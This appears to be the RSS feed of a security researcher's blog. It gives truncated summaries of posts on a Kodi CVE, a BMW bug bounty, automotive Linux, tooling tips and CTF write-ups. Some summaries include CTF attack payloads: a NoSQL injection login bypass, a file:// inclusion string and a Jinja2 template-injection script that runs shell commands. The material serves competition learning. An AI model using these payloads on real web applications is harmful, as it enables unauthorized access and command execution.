<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on DH.J</title>
    <link>https://blog.jhyeon.dev/posts/</link>
    <description>Recent content in Posts on DH.J</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sun, 14 May 2023 00:00:00 +0900</lastBuildDate><atom:link href="https://blog.jhyeon.dev/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Review a CVE-2023-23082</title>
      <link>https://blog.jhyeon.dev/posts/20230514_cve-2023-23082/</link>
      <pubDate>Sun, 14 May 2023 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20230514_cve-2023-23082/</guid>
      <description>Overview A few months ago I started doing vulnerability analysis research on open source projects and this is a quick review of vulnerabilities for one of them, the Kodi project by the XBMC Foundation.
The vulnerability was categorized as a heap overflow and a DOS vulnerability and assigned CVE-2023-23082.
More information can be found at cve.mitre.org.
https://nvd.nist.gov/vuln/detail/CVE-2023-23082 Vulnerability The vulnerability occurs in the logic of parsing image files in the Kodi process.</description>
    </item>
    
    <item>
      <title>Awarded a bounty of $500 for BMW Automotive</title>
      <link>https://blog.jhyeon.dev/posts/20230322_bmwbugbounty/</link>
      <pubDate>Wed, 22 Mar 2023 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20230322_bmwbugbounty/</guid>
      <description>Summary BMW Automotive 취약점 제보 및 명예의 전당 등재.
아마 올 해도 취약점 찾으면 올라갈 것 같다.
[사진 1] BMW Automotive Awarded a bounty of 500$ [사진 2] BMW GROUP HALL OF FAME </description>
    </item>
    
    <item>
      <title>AGL (Automotive Grade Linux) Platform</title>
      <link>https://blog.jhyeon.dev/posts/20221204_agl/</link>
      <pubDate>Sun, 04 Dec 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221204_agl/</guid>
      <description>Summary [사진 1] AGL Overview AGL (Automotive Grade Linux) OS란?
https://www.automotivelinux.org/about/members/
전 세계 차량 OEM 들과 협력하에 개발되고 있는 인포테인먼트 시스템이다.
AGL은 IVI(In Vehicle Infortainment) 시장을 목표로 하고 있다.
AGL 개발 자체는 오픈소스 프로젝트로 진행되며 AGL 이외에도 대표적으로 GENIVI 라는
플랫폼도 존재하는데 두 회사 모두 IVI S/W 개발 환경을 제공하여 다른 차량 OEM 회사들이
IVI 시스템을 쉽게 개발할 수 있도록 하는 목적을 가진다.
[사진 2] AGL/GENIVI Overview [사진 3] AGL Core AGL OS 에 올라가는 코어 부분의 구성도이다.</description>
    </item>
    
    <item>
      <title>M1 ARM 환경에서 Pwntools 설치하기</title>
      <link>https://blog.jhyeon.dev/posts/20221204_pwntools-m1/</link>
      <pubDate>Sun, 04 Dec 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221204_pwntools-m1/</guid>
      <description>Summary Mac OS M1 (ARM) 환경에서 Pwntools 설치하는 방법이다.
Intel 계열에서 해당 라이브러리를 쓰고 있던 사용자라면 ARM 에서 왜 설치가 안되지?? 하는
고충을 겪어본 적이 있을 것이다. 하지만 생각보다 간단한 코드 한줄 수정으로도 설치가 가능하니..
임시 대처 방안으로 알아두면 좋을 듯 하다.
Pwntools - Git https://github.com/Gallopsled/pwntools/blob/dev/setup.py 64번째 라인에 &#39;unicorn&amp;gt;=1.0.2rc1&#39;, 이 부분을 주석 처리해주고
sudo python3 setup.py install 명령어를 해보자 정상적으로 설치될 것이다.
[사진 1] All Done </description>
    </item>
    
    <item>
      <title>2022 POWER OF XX 예/본선 대회 운영기</title>
      <link>https://blog.jhyeon.dev/posts/20221112_poxx/</link>
      <pubDate>Sat, 12 Nov 2022 11:36:24 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221112_poxx/</guid>
      <description>Summary 지난 10월 8일 그리고 이틀 전인 11월 10일 두 번에 걸쳐서 2022 POWER OF XX 대회를 운영하였다.
예/본선 모두 CTF 플랫폼과 문제 인스턴스 등 인프라 전체 관리를 맡았고 약간의 문제(?)를 제외하면 성공적으로 대회를 운영한 것 같다.
이번에 운영했을 때 인프라를 어떻게 구성했는지를 간단하게 썰로 풀어보려고 한다.
Server Instance Name Description Spec Main-Server CTFd(v3.5.0) c5.2xlarge(8CPU, 16RAM, SSD 8GIB) Challenge-Server Ubuntu 22.04 AMD64 c5.4xlarge(16CPU, 32RAM, SSD 32GIB) 우선 서버 인스턴스는 총 2개로 메인 서버 - 문제 서버를 생성해서 사용하였다.</description>
    </item>
    
    <item>
      <title>Car Instrument Cluster Simulator</title>
      <link>https://blog.jhyeon.dev/posts/20221013_icsim/</link>
      <pubDate>Thu, 13 Oct 2022 11:36:24 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221013_icsim/</guid>
      <description>Summary 최근 자동차 해킹에 대한 소재가 많이 떠오르고 있다. 때문에 자동차 보안에 대해서도 관심을
가지시는 분들이 많을 것 같다고 생각을 하고 있다.
이번 글에서는 자동차에 들어가는 주요 통신 프로토콜 중 하나인 CAN 프로토콜이 어떤건지, 그리고
자동차의 계기판을 시뮬레이터로 만들어둔 도구를 하나 소개할 것이다.
(이 도구를 통해서 CAN 통신이 어떻게 이루어지는지를 간단하게 공부해볼 수 있다)
CAN Protocol Controller Area Network 의 약자로,
차량 내에서 Host PC 없이 Controller 또는 Device간 통신을 주고 받기 위해 사용하는 자동차 표준 통신 규격이다.</description>
    </item>
    
    <item>
      <title>DEFCON 30th Car Hacking Village 참가 후기 SSUL</title>
      <link>https://blog.jhyeon.dev/posts/20221012_defcon30/</link>
      <pubDate>Wed, 12 Oct 2022 16:36:20 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20221012_defcon30/</guid>
      <description>Summary 코시국으로 인해 세계 최대 해킹 컨퍼런스인 데프콘(DEFCON) 행사도 몇 년간 온라인으로 진행이 됐었다.
그!러!나 22년도에는 드디어 오프라인으로 데프콘 행사가 열리게 된다는 소식을 접할 수 있었다.
마침 우리 회사 팀장님이 DEFCON MAIN TALK 이랑 Car Hacking Village 에 CFP 를 제출했던 것이 Aceept 되셔서
데프콘 행사에 참가할 수 있는 명분이 생겼다. (학회 참가 &amp;amp; 대회 참가 등..)
그래서 갔다. Las Vegas 를 향해서
라스베이거스 현지 스트립 거리 도착!
끼니는 뭘 먹었을까?</description>
    </item>
    
    <item>
      <title>M1 맥북에서 Docker amd64 환경으로 빌드하기</title>
      <link>https://blog.jhyeon.dev/posts/20220626_m1-docker-architecture/</link>
      <pubDate>Sun, 26 Jun 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220626_m1-docker-architecture/</guid>
      <description>Summary 최근에 M1 Chip (ARM)이 장착된 노트북으로 바꾸면서 여러가지 환경을 구성하다가
좋은 팁들이 많아서 기록을 남겨두고자 글을 적어본다.
보통 CTF 할 때나 다른 도커 작업을 할 때 x86_64(amd64) 환경에 최적화 되어있기도 한데
M1에서는 기본이 arm64로 빌드되기 때문에 빌드할 때 아키텍처를 바꿔줘야 가능하다.
$ docker build --tag test-container:latest --platform linux/amd64 위와 같이 도커 빌드 명령을 줄 때 --platform 이라는 옵션을 추가해서 아키텍처를 바꿔줄 수 있다.
docker-compose.yml 을 통한 빌드를 할 때에도 platform: linux/amd64 이라는</description>
    </item>
    
    <item>
      <title>2022 n00bzCTF Write up</title>
      <link>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220606_n00bzctf/</guid>
      <description>Summary TEAM : DEMON
Rank : 14th
Web nosqlforyou NOSQL Injection, Authentication Bypass Exploit username=admin password={&amp;#34;$gt&amp;#34;: &amp;#34;&amp;#34;} curl-as-service Python Local File Inclusion Exploit file:///chall/challenge.py Rlass Flask Jinja2 Template SSTI Injection Exploit from requests import post import html cmd = &amp;#34;cat flag&amp;#34; mro = &amp;#34;request|attr(request.args.class)|attr(request.args.mro)&amp;#34; subclasses = &amp;#34;((%s)[3]|attr(request.args.sc))()&amp;#34; % mro popen = &amp;#34;(%s)[363]&amp;#34; % subclasses code = &amp;#34;(%s)(request.args.cmd.split(&amp;#39; &amp;#39;), stdout=-1).communicate()[0]&amp;#34; % popen payload = &amp;#34;{%%print(%s)%%} {# curl http:// #}&amp;#34; % code res = post(&amp;#39;http://167.</description>
    </item>
    
    <item>
      <title>2022 FoobarCTF Write up</title>
      <link>https://blog.jhyeon.dev/posts/20220321_foobarctf/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220321_foobarctf/</guid>
      <description>Summary TEAM : DEMON
Rank : 13th
Web Find My Location Node.JS Prototype Pollution const express = require(&amp;#39;express&amp;#39;); const bodyParser = require(&amp;#39;body-parser&amp;#39;); const cors = require(&amp;#39;cors&amp;#39;); const app = express(); const cookieParser = require(&amp;#39;cookie-parser&amp;#39;); app.use(cookieParser()); app.use(express.json()) app.set(&amp;#39;view engine&amp;#39;, &amp;#39;ejs&amp;#39;); const port = process.env.PORT || 3000 app.use(express.static(__dirname + &amp;#39;/public&amp;#39;)); app.use(cors()) const users = [ { name: &amp;#39;user&amp;#39;, password: &amp;#39;pwd&amp;#39; }, { name: &amp;#39;admin&amp;#39;, password: Math.random().toString(32), isAdmin: true }, ]; const myLoaction = [ { flag: &amp;#34;GLUG{f4k3_fl4g_f0r_t3st1ng}&amp;#34; } ] function findUser(auth) { return users.</description>
    </item>
    
    <item>
      <title>2022 CODEGATE Qual Write up</title>
      <link>https://blog.jhyeon.dev/posts/20220227_codegatequals/</link>
      <pubDate>Sun, 27 Feb 2022 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20220227_codegatequals/</guid>
      <description>Summary 코드게이트 2022 예선 대회이다. 이번 대회에서 좀 특이한 점이 있었다면 언인텐으로 풀이 가능한 문제가
2문제나 있었다는 점이다..
WEB CAFE 문제 페이지에 들어가보면 글쓰기, 검색을 할 수 있는 게시판 기능이 존재한다.
XSS 인가하고 접근을 해봤었는데 안되서 다른 유형일거라고 판단하고 소스코드 분석을 진행했다.
&amp;lt;?php if( isset($data[&amp;#39;title&amp;#39;]) &amp;amp;&amp;amp; isset($data[&amp;#39;content&amp;#39;]) ){ $title = htmlspecialchars($data[&amp;#39;title&amp;#39;]); $content = $data[&amp;#39;content&amp;#39;]; if (strpos($content, &amp;#39;&amp;lt;&amp;#39;) !== false) $result = filterHtml($content); else $result = $content; $res = insertPost($title, $result, $_SESSION[&amp;#39;id&amp;#39;]); if( $res == 0 ){ die(&amp;#39;{&amp;#34;success&amp;#34;:0}&amp;#39;); }else{ die(&amp;#39;{&amp;#34;success&amp;#34;:1}&amp;#39;); } }else{ die(&amp;#39;{&amp;#34;success&amp;#34;:0}&amp;#39;); } ?</description>
    </item>
    
    <item>
      <title>2021 사이버보안챌린지 자동차 해킹&amp;방어 대회 우승 후기</title>
      <link>https://blog.jhyeon.dev/posts/20211212_secchallenge/</link>
      <pubDate>Sun, 12 Dec 2021 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20211212_secchallenge/</guid>
      <description>Summary 이번 하반기에 진행된 사이버보안챌린지 2021 차량 해킹&amp;amp;방어 대회에서,
회사 소속으로 출전해서 최우수상 을 수상하게 되었다!
대회 환경이 AGL (Automotive Grade Linux) 라고 하는 차량 인포테인먼트 시스템 이미지를 주고,
그 시스템 안에서 취약점을 분석하고 찾아서 공격하는 것이 공격(예선전) 이였다.
처음엔 막연하게 Low 단까지 접근해서 라이브러리 취약점도 분석하고
각 서비스들 Daemon 분석하면서 취약점을 찾았었는데 원하는 결과가 잘 나오지 않았다.
실제로 라이브러리 RCE 취약점이 존재했지만 해당 시스템 상에서 트리거가 안되서 무용지물 이였다.</description>
    </item>
    
    <item>
      <title>2020 DIMICTF WEB WRITE UP</title>
      <link>https://blog.jhyeon.dev/posts/20200206_dimictf/</link>
      <pubDate>Thu, 06 Feb 2020 00:00:00 +0900</pubDate>
      
      <guid>https://blog.jhyeon.dev/posts/20200206_dimictf/</guid>
      <description>WEB 5shared &amp;lt;?php require_once &amp;#39;lib.php&amp;#39;; session_start(); $session = md5(session_id()); $uploaddir = __DIR__ . &amp;#34;/~uploads/{$session}/&amp;#34;; createDirectory(__DIR__ . &amp;#34;/~uploads/&amp;#34;); createDirectory($uploaddir); //print_r($_FILES[&amp;#39;file&amp;#39;]); $file = $_FILES[&amp;#39;file&amp;#39;]; $uploadfile = $uploaddir . $file[&amp;#39;name&amp;#39;]; // sanity check $extension = explode(&amp;#39;.&amp;#39;, $file[&amp;#39;name&amp;#39;])[1]; if (!in_array($extension, Array(&amp;#34;jpg&amp;#34;, &amp;#34;gif&amp;#34;, &amp;#34;png&amp;#34;))) { $message = &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&amp;#39;); history.back(); &amp;lt;/script&amp;gt;&amp;#34;; die($message); } // the real sanity check $real_extension = array_pop(explode(&amp;#39;.&amp;#39;, $file[&amp;#39;name&amp;#39;])); if (preg_match(&amp;#34;/php/i&amp;#34;, $file[&amp;#39;name&amp;#39;])) { $message = &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;파일 이름에 php가 들어가면 안됩니다.</description>
    </item>
    
  </channel>
</rss>
